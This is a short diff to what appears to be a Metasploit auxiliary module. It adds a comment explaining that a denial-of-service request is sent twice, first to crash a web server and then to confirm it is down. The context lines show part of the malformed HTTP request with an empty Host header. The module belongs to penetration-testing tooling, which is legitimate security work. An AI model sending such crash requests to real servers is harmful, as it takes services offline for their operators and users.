@@ -37,6 +37,8 @@ class Metasploit3 < Msf::Auxiliary
 			], self.class)
 	end
 
+	# Sends the DoS request twice.  The first request kills the server,
+	# and the second verifies that it went down.
 	def run
 		req = "GET / HTTP/1.1\r\n"
 		req << "Host:\r\n\r\nlocalhost\r\n"
